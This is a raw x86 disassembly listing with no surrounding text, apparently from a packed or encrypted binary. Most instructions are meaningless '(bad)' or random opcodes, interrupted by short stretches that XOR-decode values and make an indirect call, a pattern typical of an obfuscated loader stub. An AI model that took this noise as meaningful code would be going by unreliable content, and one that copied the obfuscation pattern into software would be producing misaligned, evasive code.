  41603e:	xchg   ebp,eax
  41603f:	jbe    0x41600b
  416041:	sbb    DWORD PTR [ebx],0xd3935ffe
  416047:	sub    DWORD PTR [ecx-0x1a7ecc46],ebp
  41604d:	adc    cl,BYTE PTR [esi+0x66]
  416050:	jl     0x415ff3
  416052:	mov    eax,DWORD PTR [edx-0x5d]
  416055:	retf   
  416056:	jmp    FWORD PTR [ebx+0x77c37c45]
  41605c:	xor    DWORD PTR ds:0x4f451f90,edi
  416062:	sbb    eax,0x1afbf41b
  416067:	mov    edx,DWORD PTR [ebp+0x8]
  41606a:	xor    eax,ecx
  41606c:	lea    eax,[eax+edx*1+0x32729c]
  416073:	mov    DWORD PTR [ebp+0x8],eax
  416076:	mov    eax,DWORD PTR [ebp-0x18]
  416079:	mov    edx,DWORD PTR [ebp+0x14]
  41607c:	xor    eax,ecx
  41607e:	add    eax,esi
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x4160a7
  41609a:	ja     0x416050
  41609c:	dec    esp
  41609d:	retf   0x7f17
  4160a0:	jo     0x41605b
  4160a2:	jle    0x416114
  4160a4:	jo     0x416097
  4160a6:	adc    al,0xd5
  4160a8:	xor    DWORD PTR [esi-0xe],0xfad7903a
  4160af:	dec    ebx
  4160b0:	icebp  
  4160b1:	mov    bl,0xf4
  4160b3:	enter  0xef6b,0x24
  4160b7:	or     DWORD PTR [ebx-0x35],edx
  4160ba:	mov    esi,0xba5df88d
  4160bf:	ds push eax
  4160c1:	rol    BYTE PTR [ebx-0x4a],1
  4160c4:	lahf   
  4160c5:	stos   DWORD PTR es:[edi],eax
  4160c6:	dec    esp
  4160c7:	ja     0x416137
  4160c9:	jmp    0xa393c7df
  4160ce:	enter  0xfc8e,0x91
  4160d2:	loopne 0x416078
  4160d4:	icebp  
  4160d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160d6:	in     al,0x37
  4160d8:	sub    BYTE PTR [esi+0x39e91e45],ch
  4160de:	(bad)  
  4160e0:	and    al,al
  4160e2:	neg    BYTE PTR [esp+edx*8-0x590e5966]
  4160e9:	aad    0x1e
  4160eb:	mov    ah,0x61
  4160ed:	(bad)  
  4160ef:	ins    BYTE PTR es:[edi],dx
  4160f0:	mov    bh,0x33
  4160f2:	mov    ebp,0x8362c247
  4160f7:	adc    bh,ch
  4160f9:	mov    bl,0xf3
  4160fb:	jns    0x4160cf
  4160fd:	sar    DWORD PTR [eax-0x75],cl
  416100:	push   edx
  416101:	sub    eax,0x26185af1
  416106:	pop    eax
  416107:	popf   
  416108:	loop   0x41615e
  41610a:	pop    esi
  41610b:	test   eax,0x75f673fe
  416110:	aaa    
  416111:	inc    ecx
  416112:	scas   al,BYTE PTR es:[edi]
  416113:	cmp    bl,BYTE PTR [edx+ebp*8+0x61]
  416117:	jecxz  0x4160e3
  416119:	cmc    
  41611a:	mov    ch,0xc4
  41611c:	xor    DWORD PTR [eax+0x38],edx
  41611f:	push   cs
  416120:	jl     0x41617b
  416122:	and    BYTE PTR [ebp+0x8abb14f],ah
  416128:	adc    DWORD PTR [edi+eiz*4-0x1ce4e54],edi
  41612f:	fstp   TBYTE PTR ds:[ebp+0xf]
  416133:	dec    ecx
  416134:	lods   al,BYTE PTR ds:[esi]
  416135:	jo     0x41612e
  416137:	add    eax,0x61ffcd1
  41613c:	pushf  
  41613d:	aaa    
  41613e:	sbb    DWORD PTR [edx-0x75],ebx
  416141:	xchg   esi,eax
  416142:	cmp    BYTE PTR [edx],bh
  416144:	sub    al,0xcb
  416146:	add    ch,BYTE PTR [ebx]
  416148:	mov    esp,0x9a4ccc9a
  41614d:	repnz imul esp,edx,0xffffff97
  416151:	xchg   ebx,eax
  416152:	jp     0x41614f
  416154:	call   0x87b6:0x3c98ecb5
  41615b:	int3   
  41615c:	lds    edx,FWORD PTR [ecx-0x35]
  41615f:	sbb    al,0x52
  416161:	loopne 0x416113
  416163:	ins    DWORD PTR es:[edi],dx
  416164:	pushf  
  416165:	repnz sub DWORD PTR [ecx],esp
  416168:	inc    ebp
  416169:	imul   edi,DWORD PTR [edi+0x10],0xffffff9d
  41616d:	mov    eax,ds:0x1a40fc06
  416172:	pop    ss
  416173:	and    bl,al
  416175:	xor    DWORD PTR [ebp-0x40522261],0x27
  41617c:	(bad)  
  41617d:	loope  0x4161b6
  41617f:	cmp    eax,0xf902dbcc
  416184:	call   0x252c:0x318d4938
  41618b:	popa   
  41618c:	inc    ebp
  41618d:	adc    eax,ebx
  41618f:	sbb    eax,0x16127dbe
  416194:	jae    0x41620e
  416196:	and    DWORD PTR [esi-0x60],esp
  416199:	xor    DWORD PTR [edi-0x112fc3e1],esp
  41619f:	dec    ecx
  4161a0:	add    eax,DWORD PTR [eax-0x4b]
  4161a3:	inc    ecx
  4161a4:	add    DWORD PTR ds:0x2c682d4b,ebx
  4161aa:	mov    bh,0x7b
  4161ac:	dec    eax
  4161ad:	and    al,0x1d
  4161af:	push   eax
  4161b0:	sub    BYTE PTR [eax+0x4f74cdff],bh
  4161b6:	bound  edi,QWORD PTR [edi+0x46]
  4161b9:	mov    BYTE PTR [edx+edx*2-0x67],ah
  4161bd:	cmp    ah,ch
  4161bf:	mov    eax,0xcbf2af6c
  4161c4:	arpl   WORD PTR ds:[edx],bx
  4161c7:	push   cs
  4161c8:	rcl    BYTE PTR [edi+0x58],0x0
  4161cc:	push   0x6cc7f3d8
  4161d1:	(bad)  
  4161d2:	sbb    ch,dl
  4161d4:	aaa    
  4161d5:	(bad)  
  4161d7:	add    DWORD PTR [ebx],ebx
  4161d9:	sbb    eax,0x748996d7
  4161de:	rcl    DWORD PTR [ebp-0x75cfa0b3],1
  4161e4:	pop    edx
  4161e5:	and    al,0x1a
  4161e7:	bound  esi,QWORD PTR [edx+0x60]
  4161ea:	fsubr  QWORD PTR [esi+eiz*2+0x43]
  4161ee:	xor    ah,ch
  4161f0:	add    BYTE PTR [edi+0x2a],0xa3
  4161f4:	adc    eax,DWORD PTR [edi+0x2f528dea]
  4161fa:	cdq    
  4161fb:	mov    eax,ds:0xef1d73a7
  416200:	fsub   QWORD PTR [eax-0x63]
  416203:	ret    
  416204:	sbb    dh,BYTE PTR [ecx+0x3d722891]
  41620a:	jecxz  0x4161b9
  41620c:	icebp  
  41620d:	pop    es
  41620e:	daa    
  41620f:	shl    DWORD PTR [ebp-0x49],0x4d
  416213:	scas   eax,DWORD PTR es:[edi]
  416214:	loope  0x4161df
  416216:	(bad)  
  416217:	pusha  
  416218:	adc    BYTE PTR [edx+esi*2-0x7a],ah
  41621c:	jg     0x416244
  41621e:	sub    al,0x5c
  416220:	inc    ebx
  416221:	fcomp  DWORD PTR [eax-0x42]
  416224:	and    esi,DWORD PTR [edi-0x32f08ce6]
  41622a:	mov    esi,0x1f16d5ca
  41622f:	dec    esp
  416230:	adc    dh,bh
  416232:	and    BYTE PTR ds:0xb7afacb8,cl
  416238:	jge    0x41623c
  41623a:	mov    eax,ds:0xdbe1f7d2
  41623f:	enter  0x4209,0xdd
  416243:	or     edx,DWORD PTR [esi+0x3a]
  416246:	mov    bh,0x2a
  416248:	push   esi
  416249:	cmp    bl,BYTE PTR [edx-0x7c9feb26]
  41624f:	loopne 0x4161ea
  416251:	xchg   DWORD PTR [edx],ebx
  416253:	cdq    
  416254:	xchg   DWORD PTR [ebx-0x1c9ed606],eax
  41625a:	and    BYTE PTR [esi-0x4f],ch
  41625d:	pop    esi
  41625e:	sbb    al,0xb8
  416260:	cdq    
  416261:	mov    al,0x40
  416263:	push   es
  416264:	pop    ds
  416265:	es inc ebp
  416267:	jno    0x4162c4
  416269:	jle    0x41624f
  41626b:	mov    ds:0xee3acc2c,eax
  416270:	mov    esp,0x6d3886d0
  416275:	push   ecx
  416276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416277:	or     BYTE PTR ds:0xe98751b8,al
  41627d:	sub    ecx,esi
  41627f:	cmp    al,BYTE PTR [eax-0x4f]
  416282:	and    al,0x78
  416284:	cmp    esp,eax
  416286:	mov    edi,0x9e884a0e
  41628b:	cmc    
  41628c:	or     ebp,ebx
  41628e:	xchg   edi,eax
  41628f:	push   ebx
  416290:	add    BYTE PTR [edx],cl
  416292:	fiadd  DWORD PTR [esi+0x6a]
  416295:	pop    es
  416296:	nop
  416297:	fcom   QWORD PTR [edi]
  416299:	div    DWORD PTR [edx+0x5]
  41629c:	xchg   ebp,eax
  41629d:	mov    WORD PTR [edx],?
  41629f:	sbb    dh,dh
  4162a1:	xor    eax,0xa21154cb
  4162a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162a7:	js     0x4162f1
  4162a9:	sbb    dh,BYTE PTR [edx-0xc]
  4162ac:	ins    BYTE PTR es:[edi],dx
  4162ad:	xchg   esp,eax
  4162ae:	int3   
  4162af:	mov    edi,0x5c62e51
  4162b4:	or     eax,0xa4e41046
  4162b9:	data16 ror BYTE PTR [ecx+0x38],1
  4162bd:	jmp    0x4162e9
  4162bf:	jae    0x4162c7
  4162c1:	ds cmp edi,edx
  4162c4:	sub    BYTE PTR [edi],ch
  4162c6:	lods   eax,DWORD PTR ds:[esi]
  4162c7:	push   esi
  4162c8:	clc    
  4162c9:	ret    
  4162ca:	xor    ah,cl
  4162cc:	icebp  
  4162cd:	and    eax,0x653b4ff5
  4162d2:	jl     0x41631e
  4162d4:	pop    ebp
  4162d5:	ss aad 0x81
  4162d8:	and    BYTE PTR [edx+0x4dd2715f],bh
  4162de:	iret   
  4162df:	and    dl,BYTE PTR [esi+0x3d]
  4162e2:	out    dx,al
  4162e3:	cmc    
  4162e4:	repnz pop ebx
  4162e6:	mov    ebp,0xc1d2f2a3
  4162eb:	or     al,0xae
  4162ed:	dec    ecx
  4162ee:	push   edi
  4162ef:	jg     0x416334
  4162f1:	and    al,0x23
  4162f3:	ror    ecx,1
  4162f5:	inc    esi
  4162f6:	fs popa 
  4162f8:	xchg   esp,eax
  4162f9:	aaa    
  4162fa:	xor    DWORD PTR [ebx],ebx
  4162fc:	mov    BYTE PTR [edi+0x6a],bh
  4162ff:	lea    eax,[esi+0x46]
  416302:	inc    esi
  416303:	(bad)  [ebx+0xd]
  416306:	cwde   
  416307:	into   
  416308:	retf   
  416309:	mov    esi,0x8bdd2182
  41630e:	imul   eax,DWORD PTR ds:0x1e077f55,0xffffffca
  416315:	jns    0x416342
  416317:	xor    BYTE PTR [ebx+0x76],bl
  41631a:	jb     0x416341
  41631c:	and    al,0x2c
  41631e:	js     0x416342
  416320:	cmpxchg bl,cl
  416323:	mov    al,0x82
  416325:	sbb    ah,BYTE PTR [edi+0x8]
  416328:	bound  ecx,QWORD PTR [ebx+0x28f2005f]
  41632e:	add    al,0xbf
  416330:	add    esi,esp
  416332:	jg     0x41631d
  416334:	xor    DWORD PTR [edi-0x10b99d14],ebx
  41633a:	fcomp  DWORD PTR [ebp-0x53]
  41633d:	(bad)  
  41633e:	bound  esi,QWORD PTR [edi+0xd]
  416341:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416342:	repz pop es
  416344:	inc    edx
  416345:	mov    ebx,0xb7055dc4
  41634a:	pop    eax
  41634c:	cmp    bl,BYTE PTR [edx]
  41634e:	rol    BYTE PTR ds:0x964fefe6,0x6
  416355:	jge    0x4163b4
  416357:	nop
  416358:	cmp    al,0x2a
  41635a:	mov    cl,0xbd
  41635c:	pop    ds
  41635d:	jmp    0xf10c:0x20df2e42
  416364:	xchg   edi,eax
  416365:	push   ebx
  416366:	pop    es
  416367:	inc    eax
  416368:	adc    al,0xed
  41636a:	fdivr  st(2),st
  41636c:	mov    ecx,DWORD PTR [ebp+0x8]
  41636f:	lea    ecx,[edx+ecx*1+0x32729c]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0x5cbcc841
  4163bf:	(bad)  
  4163c0:	jns    0x4163d5
  4163c2:	adc    al,0x7f
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x416404
  4163ca:	je     0x4163f6
  4163cc:	test   eax,0x1f4fdcd3
  4163d1:	inc    edx
  4163d2:	jg     0x4163c3
  4163d4:	repz xlat BYTE PTR ds:[ebx]
  4163d6:	repz out dx,al
  4163d8:	adc    dh,bl
  4163da:	repz sub ah,BYTE PTR [esi-0x63395ff9]
  4163e1:	cmp    eax,0x9cd8031c
  4163e6:	lds    eax,FWORD PTR [ecx+0x1b06a29e]
  4163ec:	mov    DWORD PTR [esi+0x5af66a30],ebx
  4163f2:	in     eax,0x13
  4163f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163f5:	dec    ebx
  4163f6:	pushf  
  4163f7:	out    0x2e,al
  4163f9:	push   esp
  4163fa:	mov    edi,0x7147fc09
  4163ff:	pop    ss
  416400:	sub    esi,edi
  416402:	or     eax,0xd973f368
  416407:	mov    dl,0x2e
  416409:	and    eax,0x26ea397d
  41640e:	sub    bl,cl
  416410:	(bad)  
  416411:	fwait
  416412:	(bad)  
  416413:	pushf  
  416414:	mov    eax,0xaf623d5d
  416419:	pop    ds
  41641a:	add    cl,BYTE PTR [ecx-0x55]
  41641d:	jnp    0x416442
  41641f:	stos   DWORD PTR es:[edi],eax
  416420:	push   0xffffffec
  416422:	dec    eax
  416423:	lods   eax,DWORD PTR ds:[esi]
  416424:	imul   ecx,DWORD PTR [eax+0x74],0x96bf608f
  41642b:	cmp    al,BYTE PTR [eax+0x7a]
  41642e:	inc    esi
  41642f:	ins    DWORD PTR es:[edi],dx
  416430:	cmp    edx,DWORD PTR [edi]
  416432:	ret    
  416433:	call   0x868497f0
  416438:	pop    edi
  416439:	(bad)  
  41643a:	dec    esp
  41643b:	mov    eax,ds:0xf9a3f9b3
  416440:	mov    al,BYTE PTR [ebx-0x69]
  416443:	jecxz  0x416487
  416445:	and    esp,DWORD PTR [edx-0x19615ea9]
  41644b:	fs mov ?,ebp
  41644e:	cld    
  41644f:	adc    BYTE PTR [esi],dh
  416451:	push   es
  416452:	sub    BYTE PTR [eax-0x3b],dl
  416455:	xchg   edi,esi
  416457:	add    ebx,DWORD PTR [edx-0x7e]
  41645a:	in     eax,dx
  41645b:	stos   BYTE PTR es:[edi],al
  41645c:	outs   dx,BYTE PTR ds:[esi]
  41645d:	cmp    edx,ebp
  41645f:	mov    ebx,0x4d695750
  416464:	fsub   DWORD PTR [esi+0x4f]
  416467:	fwait
  416468:	jp     0x416450
  41646a:	pop    esp
  41646b:	sub    ebp,DWORD PTR [esp+eax*1+0x73813b71]
  416472:	jbe    0x4164ce
  416474:	jns    0x416403
  416476:	fisub  DWORD PTR [ebp-0x5e]
  416479:	std    
  41647a:	gs adc al,0x9a
  41647d:	mov    al,ds:0x7d4054cf
  416482:	imul   edx,DWORD PTR [edi-0x53b20f98],0x90505305
  41648c:	lock mov edx,DWORD PTR [ecx-0x4a43ba40]
  416493:	or     ch,BYTE PTR [edi+0x55]
  416496:	pop    eax
  416497:	cwde   
  416498:	jo     0x416447
  41649a:	fsubr  st(4),st
  41649c:	imul   esi,esi,0x1724540b
  4164a2:	sahf   
  4164a3:	jno    0x416486
  4164a5:	xlat   BYTE PTR cs:[ebx]
  4164a7:	dec    ebp
  4164a8:	mov    esi,gs
  4164aa:	sub    dh,bl
  4164ac:	inc    edi
  4164ad:	add    eax,0xa9d9e811
  4164b2:	ja     0x4164e6
  4164b4:	call   0xe00f:0x5eb6a1ef
  4164bb:	xchg   esp,eax
  4164bc:	and    cl,dl
  4164be:	mov    edx,0x299ec016
  4164c3:	stos   DWORD PTR es:[edi],eax
  4164c4:	and    edi,edx
  4164c6:	fist   WORD PTR ds:0xd756d4af
  4164cc:	inc    esi
  4164cd:	push   0x9de0b8ef
  4164d2:	jge    0x416529
  4164d4:	xor    eax,0x6afba1cf
  4164d9:	not    DWORD PTR [ecx-0x3e]
  4164dc:	inc    esp
  4164dd:	pop    ebx
  4164de:	xor    al,0x56
  4164e0:	aas    
  4164e1:	int3   
  4164e2:	adc    ah,bh
  4164e4:	cdq    
  4164e5:	inc    esi
  4164e6:	add    edx,DWORD PTR [ecx-0x8d8c746]
  4164ec:	mov    al,ds:0xd296d2ce
  4164f1:	push   edx
  4164f2:	jno    0x416500
  4164f4:	retf   0xb030
  4164f7:	sbb    BYTE PTR [edx+0x57],cl
  4164fa:	cwde   
  4164fb:	push   esi
  4164fc:	fwait
  4164fd:	mov    BYTE PTR [edi],bh
  4164ff:	or     bh,BYTE PTR [ebx+edi*8]
  416502:	repnz lea edi,[esi-0x2885b46e]
  416509:	gs mov ebp,0xadcc9bf2
  41650f:	sub    bx,dx
  416512:	or     DWORD PTR [ebp-0x3a],0xffffffd6
  416516:	(bad)  
  416517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416518:	fs push edi
  41651a:	sub    dh,dh
  41651c:	mov    ah,0xd3
  41651e:	mov    esi,0x124eb44
  416523:	div    BYTE PTR [eax+0x2fa8f9a5]
  416529:	ins    DWORD PTR es:[edi],dx
  41652a:	dec    ecx
  41652b:	pop    ds
  41652c:	js     0x4164ee
  41652e:	aaa    
  41652f:	int    0x6d
  416531:	xchg   ebx,eax
  416532:	test   BYTE PTR [ebx-0x5],ah
  416535:	xor    BYTE PTR [ecx],0x31
  416538:	sub    DWORD PTR [esi],0x3b250b8f
  41653e:	rol    BYTE PTR [ebx+0xca51206],1
  416544:	clc    
  416545:	call   0x7bbbbf36
  41654a:	xchg   ebp,eax
  41654b:	cld    
  41654c:	add    DWORD PTR [esi],ebp
  41654e:	or     eax,0x25d89edb
  416553:	jbe    0x416540
  416555:	sti    
  416556:	aam    0x5
  416558:	sub    eax,0xbc0282e8
  41655d:	mov    bl,0x8d
  41655f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416560:	rol    BYTE PTR [eax+edi*8+0x705bfb1c],0xea
  416568:	jae    0x416566
  41656a:	sub    BYTE PTR [edi+ebp*8],dl
  41656d:	lock in al,dx
  41656f:	mov    BYTE PTR [edi+eiz*8],bh
  416572:	and    bl,dl
  416574:	call   0x7ce854fa
  416579:	arpl   WORD PTR [ebx+eax*4+0x65],sp
  41657d:	sbb    BYTE PTR [eax+0x6dcaed3],ah
  416583:	xchg   ebx,eax
  416584:	out    dx,al
  416585:	xor    ecx,DWORD PTR [edx-0x17bf6be2]
  41658b:	cmp    cl,BYTE PTR [eax-0xcce6186]
  416591:	cli    
  416592:	or     BYTE PTR [esi+eax*4],bl
  416595:	out    dx,eax
  416596:	jmp    0x4165d5
  416598:	std    
  416599:	pop    ebp
  41659a:	mov    dh,0xb7
  41659c:	popf   
  41659d:	jecxz  0x4165f3
  41659f:	rol    ch,1
  4165a1:	pop    eax
  4165a2:	(bad)  
  4165a3:	mov    edx,0x48821fd9
  4165a8:	enter  0xba5a,0xa2
  4165ac:	xchg   ecx,eax
  4165ad:	sbb    eax,0xaff1180a
  4165b2:	test   BYTE PTR [ebx+0x1dbe901e],dh
  4165b8:	jno    0x4165a7
  4165ba:	retf   0x88b9
  4165bd:	xor    BYTE PTR [esi+0x3dd05d2],0xae
  4165c4:	jbe    0x416595
  4165c6:	aad    0x87
  4165c8:	push   ds
  4165c9:	inc    edx
  4165ca:	pusha  
  4165cb:	sbb    al,0x13
  4165cd:	cmp    al,0x38
  4165cf:	fist   DWORD PTR [ebx+0x5f]
  4165d2:	sub    DWORD PTR [ecx-0x47],edx
  4165d5:	daa    
  4165d6:	inc    esi
  4165d7:	repz je 0x41660a
  4165da:	mov    eax,ds:0x3c7c75b
  4165df:	dec    edx
  4165e0:	sahf   
  4165e1:	out    0x3e,al
  4165e3:	push   edx
  4165e4:	mov    ah,0x54
  4165e6:	xchg   BYTE PTR [edi],ch
  4165e8:	ja     0x41659a
  4165ea:	mov    eax,0xc102ffdc
  4165ef:	ret    
  4165f0:	mov    esp,0xdcf05546
  4165f5:	les    esi,FWORD PTR [eax+0x25]
  4165f8:	inc    DWORD PTR [eax-0x57]
  4165fb:	inc    edx
  4165fc:	xchg   ebx,eax
  4165fd:	clc    
  4165fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165ff:	adc    BYTE PTR [edi],dh
  416601:	(bad)  
  416602:	out    0x77,al
  416604:	into   
  416605:	rcr    DWORD PTR [ecx+0x6a95e7f0],1
  41660b:	sar    DWORD PTR [esi+0x21],0x1
  41660f:	mov    ah,0xb0
  416611:	out    0x45,eax
  416613:	mov    ebp,0x955cfcdd
  416618:	mov    ebp,0x5123dc20
  41661d:	ins    BYTE PTR es:[edi],dx
  41661e:	jnp    0x41667f
  416620:	and    al,0x1b
  416622:	jecxz  0x4166a3
  416624:	out    0x28,al
  416626:	ja     0x416639
  416628:	loop   0x41665a
  41662a:	xor    eax,0x689c1959
  41662f:	mov    dh,0xda
  416631:	and    eax,0xce392e96
  416636:	sti    
  416637:	stos   DWORD PTR es:[edi],eax
  416638:	mov    dl,0x40
  41663a:	adc    eax,0x1404cc25
  41663f:	pop    ds
  416640:	mov    ah,0xf2
  416642:	jns    0x41668f
  416644:	adc    BYTE PTR [edx],0x57
  416647:	add    edx,DWORD PTR [esi]
  416649:	retf   
  41664a:	add    eax,0x81a91bf2
  41664f:	mov    DWORD PTR [esi+0x4e],ebp
  416652:	inc    ebx
  416653:	pop    eax
  416654:	popf   
  416655:	and    eax,0xa0a03fe0
  41665a:	adc    al,0xcd
  41665c:	imul   eax,DWORD PTR [ecx+0x2],0xffffff85
  416660:	jno    0x4166b0
  416662:	pop    eax
  416663:	mov    edi,0x43b4883a
  416668:	icebp  
  416669:	retf   
  41666a:	retf   
  41666b:	js     0x416677
  41666d:	mov    ds:0xc1e44e9a,eax
  416672:	and    DWORD PTR [ebx+0x4f],edi
  416675:	xlat   BYTE PTR ds:[ebx]
  416676:	mov    cl,0x58
  416678:	fild   DWORD PTR [ebx+0x6ca97532]
  41667e:	pushf  
  41667f:	fdivr  DWORD PTR [edi-0x2b94da80]
  416685:	call   0xa91d:0x93c01e8d
  41668c:	cmp    al,0x76
  41668e:	call   0xaabf971
  416693:	pop    ecx
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x416698
  4166ae:	int3   
  4166af:	icebp  
  4166b0:	sbb    DWORD PTR [edx+edx*1+0x7f],0x70
  4166b5:	mov    ecx,0xa970707e
  4166ba:	mov    ebx,0xbbb4d1be
  4166bf:	out    dx,eax
  4166c0:	call   0x675a96cb
  4166c5:	mov    cl,0xc9
  4166c7:	xlat   BYTE PTR ds:[ebx]
  4166c8:	xor    bl,BYTE PTR [ebx-0x19591139]
  4166ce:	sti    
  4166cf:	int3   
  4166d0:	inc    eax
  4166d1:	fcom   QWORD PTR [esp+edx*8]
  4166d4:	adc    edi,DWORD PTR [esi]
  4166d6:	(bad)  
  4166d7:	cli    
  4166d8:	std    
  4166d9:	inc    edi
  4166da:	cld    
  4166db:	inc    ebp
  4166dc:	pop    ecx
  4166dd:	cmp    DWORD PTR [ecx],ebx
  4166df:	fist   DWORD PTR [ebx-0x13560176]
  4166e5:	in     al,0x17
  4166e7:	pop    ds
  4166e8:	test   al,0x22
  4166ea:	(bad)  
  4166ec:	cmc    
  4166ed:	xchg   ecx,eax
  4166ee:	in     al,dx
  4166ef:	scas   eax,DWORD PTR es:[edi]
  4166f0:	mov    ah,0x8e
  4166f2:	(bad)  
  4166f3:	in     eax,dx
  4166f4:	jbe    0x4166bf
  4166f6:	(bad)  
  4166f8:	mov    esp,0xd517e21e
  4166fd:	or     BYTE PTR [ebx+0x359fd20e],0x1a
  416704:	out    dx,eax
  416705:	adc    BYTE PTR [ecx-0x1e922511],dh
  41670b:	dec    DWORD PTR [esi+0x46e77dc4]
  416711:	cli    
  416712:	test   esi,eax
  416714:	(bad)  
  416715:	xchg   ebx,eax
  416716:	xchg   ebx,eax
  416717:	fstp   st(1)
  416719:	nop
  41671a:	mov    dl,0xad
  41671c:	inc    ebx
  41671d:	sbb    ebp,0xb3d07853
  416723:	nop
  416724:	add    eax,0xd14fbc8c
  416729:	pop    ecx
  41672a:	and    al,0xa
  41672c:	cmp    al,0xe7
  41672e:	push   cs
  41672f:	and    dh,BYTE PTR fs:[eax-0x1344e701]
  416736:	jno    0x416771
  416738:	ret    0xbad3
  41673b:	jecxz  0x416717
  41673d:	in     eax,0x49
  41673f:	mul    cl
  416741:	outs   dx,DWORD PTR ds:[esi]
  416742:	xchg   ebp,eax
  416743:	jo     0x416720
  416745:	inc    ebx
  416746:	and    BYTE PTR [ecx-0x7],al
  416749:	mov    cl,0xa3
  41674b:	ret    0x4e42
  41674e:	ins    BYTE PTR es:[edi],dx
  41674f:	(bad)  
  416750:	jmp    0x4166f2
  416752:	xchg   esp,eax
  416753:	rcl    BYTE PTR [esi],cl
  416755:	and    ch,BYTE PTR [edx+0x4e]
  416758:	mov    BYTE PTR [ebp+0x56f6021c],dh
  41675e:	and    BYTE PTR [eax+0x3f],ah
  416761:	xchg   BYTE PTR [ebx-0x70fbb3fb],ah
  416767:	mov    WORD PTR [ebp-0x2a],?
  41676a:	pop    ss
  41676b:	mov    cl,0x75
  41676d:	push   es
  41676e:	xchg   BYTE PTR [edi+0x4a],dl
  416771:	push   eax
  416772:	test   eax,0xade47dfb
  416777:	inc    edi
  416778:	mov    eax,ds:0x957df25a
  41677d:	out    dx,al
  41677e:	xor    BYTE PTR ds:0x1aee59ce,ah
  416784:	out    dx,eax
  416785:	add    eax,eax
  416787:	pop    bx
  416789:	pusha  
  41678a:	sub    dl,BYTE PTR [edx]
  41678c:	retf   
  41678d:	mov    WORD PTR [eax+0xda09592],ds
  416793:	dec    edx
  416794:	fucomip st,st(3)
  416796:	(bad)  
  416797:	and    bl,BYTE PTR [edx+0x3b00ff90]
  41679d:	outs   dx,BYTE PTR ds:[esi]
  41679e:	ja     0x4167f9
  4167a0:	pop    esp
  4167a1:	add    eax,0x10b9384d
  4167a6:	and    eax,eax
  4167a8:	cmp    al,0xdf
  4167aa:	cmp    DWORD PTR [ebp-0x1a],eax
  4167ad:	shl    DWORD PTR [edi+eiz*2],1
  4167b0:	fwait
  4167b1:	dec    edx
  4167b2:	out    dx,eax
  4167b3:	mov    bl,0x96
  4167b5:	pop    edi
  4167b6:	mov    esp,0xb5a5b36
  4167bb:	popa   
  4167bc:	daa    
  4167bd:	cld    
  4167be:	or     BYTE PTR [ecx+eiz*4],0x73
  4167c2:	popa   
  4167c3:	in     eax,dx
  4167c4:	or     cl,BYTE PTR [ebp+0x47]
  4167c7:	pop    ss
  4167c8:	mov    edi,0x89ae8ee8
  4167cd:	push   ebx
  4167ce:	je     0x4167a4
  4167d0:	ins    DWORD PTR es:[edi],dx
  4167d1:	add    BYTE PTR [ebp+edi*2-0x3681962c],dh
  4167d8:	(bad)  
  4167d9:	adc    DWORD PTR [ecx+0x3b],eax
  4167dc:	shl    dl,cl
  4167de:	popa   
  4167df:	lea    ebx,[ebp-0x53e089d3]
  4167e5:	test   DWORD PTR [eax-0x76],ebp
  4167e8:	in     al,0xb2
  4167ea:	mov    esp,0x664569d2
  4167ef:	mov    gs,WORD PTR [ecx+0x2fba9056]
  4167f5:	out    dx,al
  4167f6:	xlat   BYTE PTR ds:[ebx]
  4167f7:	mov    WORD PTR [ebp-0x19dfa049],ss
  4167fd:	ds gs stc 
  416800:	popf   
  416801:	scas   al,BYTE PTR es:[edi]
  416802:	jns    0x416873
  416804:	add    BYTE PTR [eax],cl
  416806:	or     DWORD PTR [esi],esi
  416808:	test   ebx,edx
  41680a:	xor    esp,DWORD PTR [ebx+0x5076e93d]
  416810:	(bad)  
  416811:	ins    DWORD PTR es:[edi],dx
  416812:	jnp    0x416804
  416814:	aam    0x28
  416816:	sar    DWORD PTR [ebp+0x62],1
  416819:	push   edi
  41681a:	dec    esi
  41681b:	scas   eax,DWORD PTR es:[edi]
  41681c:	bound  ebp,QWORD PTR [ebp+0x70]
  41681f:	and    BYTE PTR [ebp-0x18ff3815],ch
  416825:	inc    esp
  416826:	ds dec esi
  416828:	mov    ecx,0x69218fcd
  41682d:	or     DWORD PTR [esi+0x1b],esp
  416830:	hlt    
  416831:	aaa    
  416832:	and    al,0xc4
  416834:	add    BYTE PTR [ecx],ah
  416836:	push   cs
  416837:	mov    ebx,0xa74e9847
  41683c:	xchg   ebp,eax
  41683d:	mov    ah,0xdd
